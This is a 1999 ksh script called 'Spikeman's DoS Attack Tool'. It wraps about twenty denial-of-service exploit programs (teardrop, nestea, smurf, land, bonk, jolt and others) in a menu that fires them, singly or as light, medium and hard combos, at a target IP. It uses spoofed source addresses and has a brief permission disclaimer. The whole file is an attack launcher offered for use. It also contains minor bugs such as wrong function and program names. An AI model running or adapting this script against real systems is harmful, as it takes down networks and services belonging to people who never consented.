#!/bin/ksh
#######################################################################
# Spikeman's DoS Attack Tool - Revision 2             Sat Feb 27 1999 #
# If you would like to experiment with this file, make sure you do    #
# It to a system which you have permission to experiment on, ahead    #
# Of time..  I cannot and will not be held responsible nor legally    #
# Bound for The malicious activities of individuals who come into     #
# Possession of This Script.                                          #
#                                                                     #
# To use this program you will need the teadrop, nestea,syndrop,      #
# newtear,bonk,smurf,boink,pepsi,jolt,spring,land,latierra and some   #
# and Some other shit you can check the source if needed....          #
#                                                                     #
# Spikeman                                                            #
# spikeman@myself.com                http://spikeman.genocide2600.com #
#######################################################################
#
# Revision 1
# Fixed The Sleep Delay , Smurf , The dev/null problem.
# New Attacks comming soon....
########
# Revision 2
# New attacks added . 1234 , beer , coke , dcd3c , gewse3
# pong , spiffit , udpdata . Menu Changes , cleanup added
########
#
SOURCE=225.225.225.225
SOURCE2=172.16.2.18
SOURCE3=135.66.66.66
SOURCE4=10.10.10.10
SOURCE5=135.66.66.66
SOURCE6=10.10.10.10
SOURCE7=132.222.123.12
SOURCE8=199.103.23.123
SOURCE9=207.69.43.66
SOURCE10=10.10.10.10
SOURCE11=199.188.87.44
SOURCE12=199.132.43.23
ATTACKIP=$1
REV=2
exitout(){
cleanup
echo "Exiting Program...."
exit
}
null(){
echo "Spikemans DoS Attack Tool      Revision $REV"
echo "This Script is Given Out Without Warranty"
echo "Scripted by Spikeman  spikeman@myself.com"
echo ""
echo "Usage ./spike.sh ip/host"
}
cleanup(){
killall -9 teardrop > /dev/null 2> /dev/null
killall -9 nestea > /dev/null 2> /dev/null
killall -9 syndrop > /dev/null 2> /dev/null
killall -9 newtear > /dev/null 2> /dev/null
killall -9 bonk > /dev/null 2> /dev/null
killall -9 smurf > /dev/null 2> /dev/null
killall -9 boink > /dev/null 2> /dev/null
killall -9 jolt > /dev/null 2> /dev/null
killall -9 sping > /dev/null 2> /dev/null
killall -9 land > /dev/null 2> /dev/null
killall -9 latierra > /dev/null 2> /dev/null
killall -9 pepsi > /dev/null 2> /dev/null
killall -9 1234 > /dev/null 2> /dev/null
killall -9 beer > /dev/null 2> /dev/null
killall -9 coke > /dev/null 2> /dev/null
killall -9 dcd3c > /dev/null 2> /dev/null
killall -9 gewse3 > /dev/null 2> /dev/null
killall -9 pong > /dev/null 2> /dev/null
killall -9 spiffit > /dev/null 2> /dev/null
killall -9 udpdata > /dev/null 2> /dev/null
killall -9 'ping -s63200' > /dev/null 2> /dev/null
}
teard(){
echo "Teadroping....."
teardrop $SOURCE $ATTACKIP -n 100 > /dev/null 2> /dev/null
echo "Completed...."
}
ntea(){
echo "Nesteaing....."
nestea $SOURCE2 $ATTACKIP 139 139 500 > /dev/null 2> /dev/null
nestea $SOURCE3 $ATTACKIP 139 80500 > /dev/null 2> /dev/null
echo "Completed...."
}
sdrop(){
echo "Syndroping....."
syndrop $SOURCE4 $ATTACKIP 139 139 500 > /dev/null 2> /dev/null
syndrop $SOURCE5 $ATTACKIP 139 90 500 > /dev/null 2> /dev/null
echo "Completed...."
}
ntear(){
echo "NewTearing....."
newtear $SOURCE6 $ATTACKIP -n 300 > /dev/null 2> /dev/null
echo "Completed...."
}
bk(){
echo "Bonking....."
bonk 119.168.83.42 $ATTACKIP 5000 0 1330 > /dev/null 2> /dev/null
echo "Completed...."
}
smrf(){
echo "Smurfing...."
smurf 129.183.83.42 $ATTACKIP 5000 0 1330 > /dev/null 2> /dev/null
echo "Completed...."
}
bandback(){
echo "Attacking On Hold For BandWidth"
sleep 16s > /dev/null 2> /dev/null
echo "Completed...."
}
bink(){
echo "Boinking....."
boink 159.184.87.43 $ATTACKIP 1 500 3 > /dev/null 2> /dev/null
echo "Completed...."
}
jlt(){
echo "Jolting....."
jolt $ATTACKIP $SOURCE 3 > /dev/null 2> /dev/null
echo "Completed...."
}
spng(){
echo "Spinging....."
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
sping $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
pingfd(){
echo "Ping Flooding....."
ping -s63200 -c30 $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
lnd(){
echo "Landing....."
land $ATTACKIP 113 > /dev/null 2> /dev/null
land $ATTACKIP 139 > /dev/null 2> /dev/null
land $ATTACKIP 135 > /dev/null 2> /dev/null
echo "Completed...."
}
latrra(){
echo "Latierraing....."
latierra -b 1 -e 1000 -s 0 -l 5 -i $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
ppsi(){
echo "Pepsing....."
pepsi -s 127.0.0.1 -n 100 $ATTACKIP > /dev/null 2> /dev/null
echo "Completed...."
}
numba(){
echo "1234ing....."
1234 $SOURCE9 $ATTACKIP 50 > /dev/null 2> /dev/null
echo "Completed...."
}
be3r(){
echo "Beering....."
beer $ATTACKIP 5 > /dev/null 2> /dev/null
echo "Completed...."
}
c0ke(){
echo "Coking....."
coke $ATTACKIP 500 > /dev/null 2> /dev/null
echo "Completed...."
}
dcde(){
echo "dcd3cing....."
dcd3c $1 > /dev/null 2> /dev/null
echo "Completed...."
}
gews3(){
echo "gewse3ing....."
gewse5 $ATTACKIP 4 > /dev/null 2> /dev/null
echo "Completed...."
}
p0ng(){
echo "Ponging....."
pong -fV -c 50 -i 1 -s 1400 $ATTACKIP $SOURCE10 > /dev/null 2> /dev/null
echo "Completed...."
}
spffit(){
echo "Spiffiting....."
spiffit $SOURCE11 139 $ATTACKIP root 500 > /dev/null 2> /dev/null
echo "Completed...."
}
udpdat(){
echo "UDPdataing....."
udpdata $SOURCE7 139 $ATTACKIP 139 > /dev/null 2> /dev/null
echo "Completed...."
}
pingonline(){
echo "Pinging to see if still online"
ping $ATTACKIP -c10
echo "Completed...."
echo "If you get a reply they are still online"
echo "If not they are off or very laged.."
}
lightattack(){
teard
ntea
sdrop
ntear
bk
smrf
lnd
numba
pingonline
}
medattack(){
teard
ntea
sdrop
ntear
bk
smrf
jlt
spng
pingfd
lnd
numba
be3r
spffit
udpdat
pingonline
}
hardattack(){
teard
ntea
sdrop
ntear
bk
smrf
bandback
bink
jlt
spng
pingfd
lnd
latrra
ppsi
bandback
numba
be3r
c0ke
dcde
gews3
p0ng
spffit
udpdat
pingonline
}
pickattack(){
echo "Type 1 to run Teardrop on $ATTACKIP"
echo "Type 2 to run Nestea on $ATTACKIP"
echo "Type 3 to run Syndrop on $ATTACKIP"
echo "Type 4 to run newtear on $ATTACKIP"
echo "Type 5 to run Bonk on $ATTACKIP"
echo "Type 6 to run Smurf on $ATTACKIP"
echo "Type 7 to run Boink on $ATTACKIP"
echo "Type 8 to run Jolt on $ATTACKIP"
echo "Type 9 to run Sping on $ATTACKIP"
echo "Type 10 to run Pingflood on $ATTACKIP"
echo "Type 11 to run Land on $ATTACKIP"
echo "Type 12 to run Latierra on $ATTACKIP"
echo "Type 13 to run Pepsi on $ATTACKIP"
echo "Type 14 to run 1234 on $ATTACKIP"
echo "Type 15 to run Beer on $ATTACKIP"
echo "Type 16 to run Coke on $ATTACKIP"
echo "Type 17 to run Dcd3c on $ATTACKIP"
echo "Type 18 to run Gewse3 on $ATTACKIP"
echo "Type 19 to run Pong on $ATTACKIP"
echo "Type 20 to run Spiffit on $ATTACKIP"
echo "Type 21 to run UDPdata on $ATTACKIP"
echo "Type exit to run Exit out"
read ATTACKS
if test $ATTACKS
then
if test $ATTACKS = 1
then
teard
exitout
elif test $ATTACKS = 2
then
ntea
exitout
elif test $ATTACKS = 3
then
sdrop
exitout
elif test $ATTACKS = 4
then
ntear
exitout
elif test $ATTACKS = 5
then
bk
exitout
elif test $ATTACKS = 6
then
smrf
exitout
elif test $ATTACKS = 7
then
bink
exitout
elif test $ATTACKS = 8
then
jlt
exitout
elif test $ATTACKS = 9
then
spng
exitout
elif test $ATTACKS = 10
then
pingfd
exitout
elif test $ATTACKS = 11
then
lnd
exitout
elif test $ATTACKS = 12
then
latrra
exitout
elif test $ATTACKS = 13
then
ppsi
exitout
elif test $ATTACKS = 14
then
numba
exitout
elif test $ATTACKS = 15
then
be3r
exitout
elif test $ATTACKS = 16
then
c0ke
exitout
elif test $ATTACKS = 17
then
dcdc
exitout
elif test $ATTACKS = 18
then
gews3
exitout
elif test $ATTACKS = 19
then
p0ng
exitout
elif test $ATTACKS = 20
then
spffit
exitout
elif test $ATTACKS = 21
then
udpdat
exitout
elif test $ATTACKS = exit
then
exitout
fi
fi
}
comboattacks(){
echo "Type 1 Light Combo Attack On $ATTACKIP"
echo "Type 2 Medium Combo Attack On $ATTACKIP"
echo "Type 3 Hard Combo Attack On $ATTACKIP"
echo "Type 4 To Exit Out"
read PICKTWO
if test $PICKTWO
then
if test $PICKTWO = 1
then
lightattack
exitout
elif test $PICKTWO = 2
then
medattack
exitout
elif test $PICKTWO = 3
then
hardattack
exitout
elif test $PICKTWO = exit
then
exitout
fi
fi
}
if [ $# != 1 ]
then
null
exit
else
echo "Type 1 for Combo Attacks"
echo "Type 2 for Pick The Attack"
echo "Type 3 To Run Clean up (Kill Hung Attacks)"
echo "Type 4 To Exit Out"
read PICKONE
if test $PICKONE
then
if test $PICKONE = 1
then
comboattacks
exitout
elif test $PICKONE = 2
then
pickattack
exitout
elif test $PICKONE = 3
then
cleanup
exitout
elif test $PICKONE = 4
then
exitout
fi
fi
fi
fi
